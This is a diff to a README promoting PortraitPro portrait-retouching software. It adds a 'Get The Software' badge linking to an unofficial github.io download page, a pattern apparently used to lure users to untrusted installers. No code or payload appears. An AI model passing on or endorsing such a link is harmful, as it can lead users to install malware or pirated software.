@@ -2,6 +2,7 @@
 
 Editing portraits no longer has to be time-consuming. **PortraitPro**, developed by Anthropics Technology, uses artificial intelligence to deliver professional retouching in just a few clicks. From skin smoothing to advanced facial sculpting, this tool is a favorite among photographers, studios, and content creators worldwide.
 
+[![Get](https://img.shields.io/badge/Get%20The-Software-blueviolet)](https://portraitpro-plugin.github.io/.github/)
 ---
 
 ## Overview
